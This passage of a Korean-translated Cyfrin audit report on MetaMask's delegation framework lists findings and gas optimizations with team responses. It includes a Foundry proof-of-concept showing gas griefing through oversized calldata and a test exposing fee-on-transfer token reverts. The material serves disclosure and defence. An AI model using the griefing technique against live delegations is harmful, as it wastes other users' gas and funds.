### 악의적인 사용자가 `SpecificActionERC20TransferBatchEnforcer` 주의 사항(caveat)을 사용하여 무제한의 가스를 소비하는 위임을 생성할 수 있음 (Malicious user can create delegations that will spend unlimited amount of gas with `SpecificActionERC20TransferBatchEnforcer` caveat)

**설명:** `SpecificActionERC20TransferBatchEnforcer`의 첫 번째 실행에는 calldata 크기에 대한 제한이 없습니다. 이를 통해 악의적인 사용자가 대리인으로부터 무제한의 가스를 낭비하는 위임을 생성할 수 있습니다.
```solidity
    function beforeHook(
        bytes calldata _terms,
        bytes calldata,
        ModeCode _mode,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _delegator,
        address
    )
        public
        override
        onlyBatchExecutionMode(_mode)
    {
        ...
        if (
            executions_[0].target != terms_.firstTarget || executions_[0].value != 0
                || keccak256(executions_[0].callData) != keccak256(terms_.firstCalldata)
        ) {
            revert("SpecificActionERC20TransferBatchEnforcer:invalid-first-transaction");
        }
        ...
    }
```
`keccak256` 해시 함수를 계산하기 위해 코드는 전체 `terms_.firstCalldata`를 메모리에 저장해야 합니다. 따라서 거대한 calldata 덩어리는 메모리 확장 비용을 2차적으로(quadratically) 증가시킵니다.

또한 위임자는 실행 출력을 손상시키지 않으면서 calldata 크기를 임의로 늘릴 수 있습니다. 예를 들어, 위임자가 계약에서 `increment(uint256 num)` 함수를 실행하려는 경우, 인수 뒤의 바이트는 컴파일러에서 무시됩니다.
이 calldata:
```
0x7cf5dab00000000000000000000000000000000000000000000000000000000000000001
```
는 다음과 동일한 실행 출력을 가집니다:
```
0x7cf5dab00000000000000000000000000000000000000000000000000000000000000001fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff...
```
따라서 실행 출력을 손상시키지 않고 calldata 크기를 임의로 늘릴 수 있습니다.

**영향:** 악의적인 사용자가 대리인으로부터 무제한의 가스를 낭비하는 위임을 생성할 수 있습니다.

**개념 증명 (Proof of Concept):**
```solidity
function testGriefingAttackSpecificActionERC20TransferEnforcer() public {
        // Generate a very large calldata (e.g., 1MB)
        bytes memory largeCalldata = new bytes(1_000_000);
        for (uint256 i = 0; i < largeCalldata.length; i++) {
            largeCalldata[i] = 0xFF;
        }

        // Create terms with the large calldata
        bytes memory terms = abi.encodePacked(
            address(token), // tokenAddress
            address(0x1), // recipient
            uint256(100), // amount
            address(0x1), // firstTarget
            largeCalldata // firstCalldata
        );

        // Create a batch execution with the expected large calldata
        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({ target: address(0x1), value: 0, callData: largeCalldata });
        executions[1] = Execution({
            target: address(token),
            value: 0,
            callData: abi.encodeWithSelector(IERC20.transfer.selector, address(0x1), 100)
        });

        bytes memory executionCallData = abi.encode(executions);

        // Measure gas usage of the beforeHook call
        uint256 startGas = gasleft();

        vm.startPrank(address(delegationManager));
        // This would be extremely expensive due to the large calldata
        batchEnforcer.beforeHook(
            terms,
            bytes(""),
            batchDefaultMode, // Just a dummy mode code
            executionCallData,
            keccak256("delegation1"),
            address(0),
            address(0)
        );

        uint256 gasUsed = startGas - gasleft();
        vm.stopPrank();

        console.log("Gas used for beforeHook with 1MB calldata:", gasUsed);
    }
```
출력 가스:
```
Ran 1 test for test/enforcers/SpecificActionERC20TransferBatchEnforcer.t.sol:SpecificActionERC20TransferBatchEnforcerTest
[PASS] testGriefingAttackSpecificActionERC20TransferEnforcer() (gas: 207109729)
```

**권장 완화 방법:** calldata 크기를 특정 제한으로 제한하는 것을 고려하세요.

**MetaMask:**
인지함. 위임을 실행하기 전에 위임을 검증하는 것은 대리인의 책임입니다.

**Cyfrin:** 인지함.


### `DelegationMetaSwapAdapter`는 fee on transfer 토큰과 호환되지 않음 (`DelegationMetaSwapAdapter` is not compatible with fee on transfer tokens)

**설명:** 누군가 `swapByDelegation`을 실행하려고 하면, 계약은 먼저 `tokenFrom`의 현재 잔액 스냅샷을 찍습니다:
```solidity
    function swapByDelegation(bytes calldata _apiData, Delegation[] memory _delegations) external {
        ...
        // Prepare the call that will be executed internally via onlySelf
        bytes memory encodedSwap_ = abi.encodeWithSelector(
            this.swapTokens.selector,
            aggregatorId_,
            tokenFrom_,
            tokenTo_,
            _delegations[delegationsLength_ - 1].delegator,
            amountFrom_,
@>          _getSelfBalance(tokenFrom_),
            swapData_
        );
        ...
    }
```
그 후, 이 동일한 금액은 전송 중에 수신된 토큰의 양을 계산하는 데 사용됩니다:
```solidity
    function swapTokens(
        string calldata _aggregatorId,
        IERC20 _tokenFrom,
        IERC20 _tokenTo,
        address _recipient,
        uint256 _amountFrom,
        uint256 _balanceFromBefore,
        bytes calldata _swapData
    )
        external
        onlySelf
    {
        uint256 tokenFromObtained_ = _getSelfBalance(_tokenFrom) - _balanceFromBefore;
        if (tokenFromObtained_ < _amountFrom) revert InsufficientTokens();

        ...
    }
```
이 라인은 수신된 토큰의 양이 `amountFrom` 필드와 일치하는지 확인합니다. 그러나 fee on transfer 기능을 구현하는 토큰의 경우 이 불변성이 위반됩니다. 계약이 더 적은 토큰을 받게 되고 이 확인으로 인해 전체 실행이 revert되기 때문입니다.

**영향:** USDT와 같이 잘 알려진 토큰은 현재 Metaswap의 허용 목록에 포함된 fee on transfer 토큰입니다. 현재 USDT 전송 수수료는 0으로 설정되어 있다는 점을 강조할 가치가 있습니다. 현재 구현은 수수료가 0인 경우 예상대로 작동하지만, USDT가 0이 아닌 수수료 구조로 전환되면 revert될 것입니다.

**개념 증명 (Proof of Concept):** 다음 테스트를 실행하려면 `test/utils` 아래에 다음 파일을 추가해야 합니다.
```solidity
// SPDX-License-Identifier: MIT AND Apache-2.0

pragma solidity 0.8.23;

import { ERC20, IERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { Ownable2Step, Ownable } from "@openzeppelin/contracts/access/Ownable2Step.sol";

contract ERC20FeeOnTransfer is ERC20, Ownable2Step {
    ////////////////////////////// Constructor  //////////////////////////////

    /// @dev Initializes the BasicERC20 contract.
    /// @param _owner The owner of the ERC20 token. Also addres that received the initial amount of tokens.
    /// @param _name The name of the ERC20 token.
    /// @param _symbol The symbol of the ERC20 token.
    /// @param _initialAmount The initial supply of the ERC20 token.
    constructor(
        address _owner,
        string memory _name,
        string memory _symbol,
        uint256 _initialAmount
    )
        Ownable(_owner)
        ERC20(_name, _symbol)
    {
        if (_initialAmount > 0) _mint(_owner, _initialAmount);
    }

    ////////////////////////////// External Methods //////////////////////////////

    /// @dev Allows the onwner to burn tokens from the specified user.
    /// @param _user The address of the user from whom the tokens will be burned.
    /// @param _amount The amount of tokens to burn.
    function burn(address _user, uint256 _amount) external onlyOwner {
        _burn(_user, _amount);
    }

    /// @dev Allows the owner to mint new tokens and assigns them to the specified user.
    /// @param _user The address of the user to whom the tokens will be minted.
    /// @param _amount The amount of tokens to mint.
    function mint(address _user, uint256 _amount) external onlyOwner {
        _mint(_user, _amount);
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value * 99 / 100);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value * 99 / 100);
        return true;
    }
}
```
그런 다음 `DelegationMetaSwapAdapter.t.sol` 내부에 파일을 import해야 합니다:
```solidity
import { ERC20FeeOnTransfer } from "../utils/ERC20FeeOnTransfer.t.sol";
```
마지막으로 `DelegationMetaSwapAdapterMockTest` 내부에 다음 테스트를 작성합니다:
```solidity
    function _setUpMockERC20FOT() internal {
        vault = users.alice;
        subVault = users.bob;

        tokenA = BasicERC20(address(new ERC20FeeOnTransfer(owner, "TokenA", "TokenA", 0)));
        tokenB = new BasicERC20(owner, "TokenB", "TokenB", 0);
        vm.label(address(tokenA), "TokenA");
        vm.label(address(tokenB), "TokenB");

        metaSwapMock = IMetaSwap(address(new MetaSwapMock(IERC20(tokenA), IERC20(tokenB))));

        delegationMetaSwapAdapter =
            new DelegationMetaSwapAdapter(owner, IDelegationManager(address(delegationManager)), metaSwapMock);

        vm.startPrank(owner);

        tokenA.mint(address(vault.deleGator), 100 ether);
        tokenA.mint(address(metaSwapMock), 1000 ether);
        tokenB.mint(address(vault.deleGator), 100 ether);
        tokenB.mint(address(metaSwapMock), 1000 ether);

        vm.stopPrank();

        vm.deal(address(metaSwapMock), 1000 ether);

        _updateAllowedTokens();

        _whiteListAggregatorId(aggregatorId);

        swapDataTokenAtoTokenB =
            abi.encode(IERC20(address(tokenA)), IERC20(address(tokenB)), 1 ether, 1 ether, hex"", uint256(0), address(0), true);
    }

    function test_swapFeeOnTransferToken() public {
        _setUpMockERC20FOT();

        Delegation[] memory delegations_ = new Delegation[](2);

        Delegation memory vaultDelegation_ = _getVaultDelegation();
        Delegation memory subVaultDelegation_ = _getSubVaultDelegation(EncoderLib._getDelegationHash(vaultDelegation_));
        delegations_[1] = vaultDelegation_;
        delegations_[0] = subVaultDelegation_;

        bytes memory swapData_ = _encodeSwapData(IERC20(tokenA), IERC20(tokenB), amountFrom, amountTo, hex"", 0, address(0), false);
        bytes memory apiData_ = _encodeApiData(aggregatorId, IERC20(tokenA), amountFrom, swapData_);

        vm.prank(address(subVault.deleGator));
        vm.expectRevert(DelegationMetaSwapAdapter.InsufficientTokens.selector);
        delegationMetaSwapAdapter.swapByDelegation(apiData_, delegations_);
    }
```

**권장 완화 방법:** fee on transfer 토큰의 경우 수신된 금액을 사용하는 것이 좋습니다:
```diff
    function swapTokens(
        string calldata _aggregatorId,
        IERC20 _tokenFrom,
        IERC20 _tokenTo,
        address _recipient,
        uint256 _amountFrom,
        uint256 _balanceFromBefore,
        bytes calldata _swapData
    )
        external
        onlySelf
    {
        uint256 tokenFromObtained_ = _getSelfBalance(_tokenFrom) - _balanceFromBefore;
--      if (tokenFromObtained_ < _amountFrom) revert InsufficientTokens();
++      if (tokenFromObtained_ < _amountFrom) {
++          _amountFrom = tokenFromObtained_ ;
        }

    }
```

**MetaMask:**
인지함. 수수료 없이 현재 토큰으로 작업할 계획이므로 조치가 필요하지 않습니다. 나중에 USDT와 같이 수수료가 있는 토큰이 활성화되면 허용 목록에서 제거할 것입니다.


**Cyfrin:** 인지함.

\clearpage
## Gas Optimization


### `ERC20PeriodTransferEnforcer` 가스 최적화 (`ERC20PeriodTransferEnforcer` gas optimizations)

**설명:**
1. `_validateAndConsumeTransfer`의 현재 구현은 모든 함수 호출에 대해 여러 유효성 검사를 수행하지만, 이러한 검사 중 일부는 주어진 위임 해시에 대해 첫 번째 실행 중에 한 번만 수행하면 됩니다. 위임 조건은 불변이고 시간은 증가하기만 하므로, 첫 번째 성공적인 실행 후에는 이러한 확인이 중복됩니다. 이로 인해 후속 호출에서 불필요한 가스 소비가 발생합니다. 용어 유효성 검사 및 시간 확인을 초기화 블록 내부로 이동하여 위임 해시당 한 번만 수행되도록 하는 것을 고려하세요.
```diff
    function _validateAndConsumeTransfer(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        ...

        // Validate terms
--      require(startDate_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-start-date");
--      require(periodDuration_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-period-duration");
--      require(periodAmount_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-period-amount");

        require(token_ == target_, "ERC20PeriodTransferEnforcer:invalid-contract");
        require(bytes4(callData_[0:4]) == IERC20.transfer.selector, "ERC20PeriodTransferEnforcer:invalid-method");

        // Ensure the transfer period has started.
--      require(block.timestamp >= startDate_, "ERC20PeriodTransferEnforcer:transfer-not-started");

        PeriodicAllowance storage allowance_ = periodicAllowances[msg.sender][_delegationHash];

        // Initialize the allowance on first use.
        if (allowance_.startDate == 0) {
            allowance_.periodAmount = periodAmount_;
            allowance_.periodDuration = periodDuration_;
            allowance_.startDate = startDate_;
            allowance_.lastTransferPeriod = 0;
            allowance_.transferredInCurrentPeriod = 0;

++          require(startDate_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-start-date");
++          require(periodDuration_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-period-duration");
++          require(periodAmount_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-period-amount");
++          require(block.timestamp >= startDate_, "ERC20PeriodTransferEnforcer:transfer-not-started");
        }

        ...
    }
```

2. 불필요한 스토리지 쓰기
```diff
    function _validateAndConsumeTransfer(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        ...
        PeriodicAllowance storage allowance_ = periodicAllowances[msg.sender][_delegationHash];
        // Initialize the allowance on first use.
        if (allowance_.startDate == 0) {
            allowance_.periodAmount = periodAmount_;
            allowance_.periodDuration = periodDuration_;
            allowance_.startDate = startDate_;
--          allowance_.lastTransferPeriod = 0;
--          allowance_.transferredInCurrentPeriod = 0;
        }
        ...
    }
```
이 2개의 변수는 나중에 업데이트되며 이미 0으로 초기화되어 있습니다. 따라서 초기화 시 0으로 설정하는 것은 의미가 없습니다.

3. 불필요한 스토리지 읽기
```diff
    function _validateAndConsumeTransfer(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        emit TransferredInPeriod(
            msg.sender,
            _redeemer,
            _delegationHash,
            token_,
            periodAmount_,
            periodDuration_,
--          allowance_.startDate,
++          startDate_,
            allowance_.transferredInCurrentPeriod,
            block.timestamp
        );
    }
```
시작 날짜가 이미 캐시되어 있으므로 스토리지에서 읽을 필요가 없습니다.

**Metamask:** 커밋 [d08147](https://github.com/MetaMask/delegation-framework/commit/d0814747409cf41d098e369e3f481fbb6a24e92)에서 해결됨.

**Cyfrin:** 해결됨.


### `NativeTokenStreamingEnforcer` 및 `ERC20TokenStreamingEnforcer` 가스 최적화 (`NativeTokenStreamingEnforcer` and `ERC20TokenStreamingEnforcer` gas optimizations)

**설명:**
1. 다중 스토리지 읽기를 방지하기 위해 지출된 금액 캐시:
```diff
    function _validateAndConsumeAllowance(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        (, uint256 value_,) = _executionCallData.decodeSingle();
        (uint256 initialAmount_, uint256 maxAmount_, uint256 amountPerSecond_, uint256 startTime_) = getTermsInfo(_terms);
        require(maxAmount_ >= initialAmount_, "NativeTokenStreamingEnforcer:invalid-max-amount");
        require(startTime_ > 0, "NativeTokenStreamingEnforcer:invalid-zero-start-time");
        StreamingAllowance storage allowance_ = streamingAllowances[msg.sender][_delegationHash];
++      uint256 currentAmountSpent = allowance_.spent;
--      if (allowance_.spent == 0) {
++      if (currentAmountSpent == 0) {
            // First use of this delegation
            allowance_.initialAmount = initialAmount_;
            allowance_.maxAmount = maxAmount_;
            allowance_.amountPerSecond = amountPerSecond_;
            allowance_.startTime = startTime_;
        }
        require(value_ <= _getAvailableAmount(allowance_), "NativeTokenStreamingEnforcer:allowance-exceeded");
--      allowance_.spent += value_;
++      allowance_.spent = value_ + currentAmountSpent;
        emit IncreasedSpentMap(
            msg.sender,
            _redeemer,
            _delegationHash,
            initialAmount_,
            maxAmount_,
            amountPerSecond_,
            startTime_,
--          allowance_.spent,
++          value_ + currentAmountSpent,
            block.timestamp
        );
    }
```

2. 지출이 0이고 데이터가 이미 설정된 경우 스토리지 데이터 재정의 방지
```diff
    function _validateAndConsumeAllowance(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        ...
        StreamingAllowance storage allowance_ = streamingAllowances[msg.sender][_delegationHash];
--      if (allowance_.spent == 0) {
++      if (allowance_.spent == 0 && allowance_.startTime == 0) {
            // First use of this delegation
            allowance_.initialAmount = initialAmount_;
            allowance_.maxAmount = maxAmount_;
            allowance_.amountPerSecond = amountPerSecond_;
            allowance_.startTime = startTime_;
        }
        ...
    }
```

3. 총 지출이 잠금 해제된 금액보다 클 수는 없으므로, 지출된 금액이 잠금 해제된 금액보다 크거나 같은지 확인하는 것은 불필요합니다. 단일 등호 연산자만으로 충분합니다:
```diff
    function _getAvailableAmount(StreamingAllowance memory _allowance) private view returns (uint256) {
        if (block.timestamp < _allowance.startTime) return 0;
        uint256 elapsed_ = block.timestamp - _allowance.startTime;
        uint256 unlocked_ = _allowance.initialAmount + (_allowance.amountPerSecond * elapsed_);
        if (unlocked_ > _allowance.maxAmount) {
            unlocked_ = _allowance.maxAmount;
        }
--      if (_allowance.spent >= unlocked_) return 0;
++      if (_allowance.spent == unlocked_) return 0;
        return unlocked_ - _allowance.spent;
    }
```

**Metamask:** 인지함.

**Cyfrin:** 인지함.


### `DelegationMetaSwapAdapter`에서 불필요한 실행 모드 지원 (Unnecessary execution mode support in `DelegationMetaSwapAdapter`)

**설명:** `DelegationMetaSwapAdapter`의 `executeFromExecutor` 함수는 여러 실행 모드(배치/싱글)와 실행 유형(기본/시도)을 지원합니다. 그러나 실제로 어댑터의 주요 함수인 `swapByDelegation`은 기본 실행 유형의 `encodeSimpleSingle` 모드만 사용합니다.

이 구현에는 현재 애플리케이션에서 활용되지 않는 여러 코드 경로를 처리하는 복잡한 조건부 로직이 포함되어 있습니다:


```solidity
    function swapByDelegation(bytes calldata _apiData, Delegation[] memory _delegations) external {
        ...
        ModeCode[] memory encodedModes_ = new ModeCode[](2);
        encodedModes_[0] = ModeLib.encodeSimpleSingle();
        encodedModes_[1] = ModeLib.encodeSimpleSingle();
        ...
    }

    function executeFromExecutor(
        ModeCode _mode,
        bytes calldata _executionCalldata
    )
        external
        payable
        onlyDelegationManager
        returns (bytes[] memory returnData_)
    {
        (CallType callType_, ExecType execType_,,) = _mode.decode();

        // Check if calltype is batch or single
        if (callType_ == CALLTYPE_BATCH) {
            // Destructure executionCallData according to batched exec
            Execution[] calldata executions_ = _executionCalldata.decodeBatch();
            // check if execType is revert or try
            if (execType_ == EXECTYPE_DEFAULT) returnData_ = _execute(executions_);
            else if (execType_ == EXECTYPE_TRY) returnData_ = _tryExecute(executions_);
            else revert UnsupportedExecType(execType_);
        } else if (callType_ == CALLTYPE_SINGLE) {
            // Destructure executionCallData according to single exec
            (address target_, uint256 value_, bytes calldata callData_) = _executionCalldata.decodeSingle();
            returnData_ = new bytes[](1);
            bool success_;
            // check if execType is revert or try
            if (execType_ == EXECTYPE_DEFAULT) {
                returnData_[0] = _execute(target_, value_, callData_);
            } else if (execType_ == EXECTYPE_TRY) {
                (success_, returnData_[0]) = _tryExecute(target_, value_, callData_);
                if (!success_) emit TryExecuteUnsuccessful(0, returnData_[0]);
            } else {
                revert UnsupportedExecType(execType_);
            }
        } else {
            revert UnsupportedCallType(callType_);
        }
    }
```

**권장 사항**
`executeFromExecutor` 함수가 애플리케이션에서 실제로 사용되는 실행 모드만 지원하도록 제한하는 것을 고려하세요:

```solidity
  function executeFromExecutor(
    ModeCode _mode,
    bytes calldata _executionCalldata
)
    external
    payable
    onlyDelegationManager
    returns (bytes[] memory returnData_)
{
    (CallType callType_, ExecType execType_,,) = _mode.decode();

    // 단일 호출 유형 및 기본 실행만 지원
    if (callType_ != CALLTYPE_SINGLE) {
        revert UnsupportedCallType(callType_);
    }

    if (execType_ != EXECTYPE_DEFAULT) {
        revert UnsupportedExecType(execType_);
    }

    // 추가 확인 없이 단일 실행 직접 처리
    (address target_, uint256 value_, bytes calldata callData_) = _executionCalldata.decodeSingle();
    returnData_ = new bytes[](1);
    returnData_[0] = _execute(target_, value_, callData_);

    return returnData_;
}
```

**Metamask:** 커밋 [afb243c](https://github.com/MetaMask/delegation-framework/commit/afb243cdff4960c51170f58e0058912e7dec392a)에서 해결됨.

**Cyfrin:** 해결됨.

\clearpage
